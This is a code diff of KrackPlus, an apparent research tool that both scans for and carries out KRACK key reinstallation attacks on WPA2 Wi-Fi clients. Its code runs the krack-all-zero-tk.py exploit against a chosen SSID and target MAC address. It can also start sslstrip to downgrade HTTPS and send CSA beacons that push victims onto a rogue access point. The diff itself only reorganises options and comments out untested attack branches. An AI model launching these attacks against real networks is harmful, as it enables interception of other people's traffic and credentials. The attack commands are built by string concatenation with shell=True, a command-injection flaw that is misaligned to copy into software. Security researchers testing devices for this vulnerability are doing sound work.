@@ -41,7 +41,7 @@ log.debug("KrackPlus is a tool to scan for and exploit the KRACK vulnerability i
 log.debug("KrackPlus 1.0 by Lars Magnus Trinborgholen, Fredrik Walloe and Lars Kristian Maehlum.\n")
 
 def main():
-    USAGE = "\nKrackPlus Scan:   ./krackPlus.py [-s]\n\t          ./krackPlus.py [-s] [--set-ssid SSID] [--set-password PASSWORD] [--path PATH]\nKrackPlus Attack: ./krackPlus.py [-a] [-m --nic-rogue-monitor NIC] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address] [--continuous-csa] [--group] [--pcap FILENAME]"
+    USAGE = "\nKrackPlus Scan:   ./krackPlus.py [-s]\n\t          ./krackPlus.py [-s] [--set-ssid SSID] [--set-password PASSWORD] [--path PATH]\nKrackPlus Attack: ./krackPlus.py [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address] [--continuous-csa] [--group] [--pcap FILENAME]"
 
     parser = optparse.OptionParser(usage=USAGE)
 
@@ -57,7 +57,7 @@ def main():
     parser.add_option('--set-password', default='abcdefgh', help="Use this option to set the password for the created network."
                       " Password length has to be 8 characters or more!", dest='password')
     parser.add_option('--path', '-p', help="Set path where scan report should be saved", dest='path')
-
+    parser.add_option("--group", help="Only perform scan of  the group key handshake", dest='group', action='store_true')
  # KRACK+ Attack options
     # Required arguments
     parser.add_option('--attack', '-a', default=False, help="This option will run a key reinstallation attack against ....", dest='attack', action='store_true')
@@ -68,7 +68,8 @@ def main():
     parser.add_option('--target-ssid', help="This option is used to specify target network/ssid", dest='targetSSID')
     parser.add_option('--target', '-t', help="This option is used to specifiy target device using MAC-adress when running attack.", dest='target')
     # Optional arguments
-    parser.add_option("-m", "--nic-rogue-monitor", help="Wireless NIC that will listen on the channel of the rogue AP.", dest='monRogue')
+    # TODO: this should work, but unable to test without compatible secondary external NIC. Commented out until we've verified that this works. 
+    #parser.add_option("-m", "--nic-rogue-monitor", help="Wireless NIC that will listen on the channel of the rogue AP.", dest='monRogue')
     parser.add_option('--pcap', help="Save packet capture to file as a pcap. Provide a filename; $NIC.pcap will be appended to the name. Not compatible with --dd", dest='pcap')
     parser.add_option('--sslstrip', help="Use this option to enable sslstrip in an attempt to downgrade HTTPS to HTTP.", action='store_true')
     parser.add_option("-c", "--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second) in order to push the target to the channel of the rogue AP", dest='csa', action='store_true')
@@ -76,8 +77,7 @@ def main():
     # General KRACK+ options:
     parser.add_option('--restore', '-r', help="This option will restore internet connection (wifi). Hopefully you'll never have to use this option.", dest='restore', default=False, action='store_true')
     parser.add_option('-d', help="This option will increase output verbosity for KRACK+ Scan or Attack", dest='debug', action='store_true')
-    parser.add_option('--dd', help="This option will increase output verbosity even more for KRACK+ Scan or Attack (debugging purposes). Can be combined with -d", dest='dd', action='store_true')
-    parser.add_option("--group", help="Only perform scan/attack on the group key handshake", dest='group', action='store_true') #TODO implement this!
+    parser.add_option('--dd', help="This option will increase output verbosity even more for KRACK+ Scan or Attack (debugging purposes). Can be combined with -d", dest='dd', action='store_true') 
     
     options, args = parser.parse_args()
     
@@ -119,7 +119,7 @@ def main():
                     pass
             # Generates report of results in user-supplied or default location and tells user where it is
             writeResults()
-            # TODO It should not be necessary to make this file, bit that requires a rewrite of genPDF
+            # TODO It should not be necessary to make this file, but that requires a rewrite of generatePDF
             if options.group:
                                 subprocess.call(["touch vulnToPairwise.txt"], shell=True)
             if options.path:
@@ -172,35 +172,26 @@ def main():
                 # Starts sslstrip and runs it in the background
                 elif options.sslstrip:
                     subprocess.Popen(["sslstrip -w reports/sslstrip.log &"], shell=True)
-
-                # Starts the attack against the group key only
-                elif options.group and not options.monRogue:
-                    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
-                                         options.mon + " " + options.targetSSID + " --target " + options.target + "- " + "--group" + " &"], stdout=attackOutput, shell=True)                
-
-                # Starts the attack with the monitor interface enabled
-                elif options.monRogue and not options.group:
-                    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py -m" + options.monRogue + " " + options.rogue + " " +
-                                         options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
                 
-                # Starts the attack against the group key only, with the monitor interface enabled
-                elif options.monRogue and options.group:
-                    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py -m" + options.monRogue + " " + options.rogue + " " +
-                                         options.mon + " " + options.targetSSID + " --target " + options.target + "- " + options.group + " &"], stdout=attackOutput, shell=True) 
-               
-                # Starts attack and sends CSA beacons every 10 seconds and also use one interface to monitor the rogue channel.
-                elif options.csa and options.monRogue:
-                    log.info("Performing Key reinstallation attacks with continuous CSA and listening on the rogue AP channel")
-                    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py -m" + options.monRogue + options.rogue + " " +
-                                         options.mon + " " + options.targetSSID + " --target " + options.target + " --continuous-csa" + " &"], stdout=attackOutput, shell=True)
-
+                # TODO A fix is needed to make --group work on the attack side. Commented out for that reason.
+                # Starts the attack against the group key only
+                #elif options.group:
+                #    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
+                #                         options.mon + " " + options.targetSSID + " --target " + options.target + "- " + "--group" + " &"], stdout=attackOutput, shell=True)                
+                
+                # TODO: this should work, but unable to test without compatible secondary external NIC. Commented out until we've verified that this works. 
+                # Starts the attack with the monitor interface enabled
+                #elif options.monRogue:
+                #    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py -m" + options.monRogue + " " + options.rogue + " " +
+                #                         options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
+            
                 # Starts attack and sends CSA beacons every 10 seconds
-                elif options.csa and not (options.monRogue or options.pcap):
+                elif options.csa and not options.pcap:
                     log.info("Performing Key reinstallation attacks with continuous CSA")
                     subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                          options.mon + " " + options.targetSSID + " --target " + options.target + " --continuous-csa" + " &"], stdout=attackOutput, shell=True)
 
-                # Launches the 'standard' attack, without pcap or debug enabled. 
+                # Launches the 'standard' attack, without pcap, debug or CSA enabled. 
                 else:
                     subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                          options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
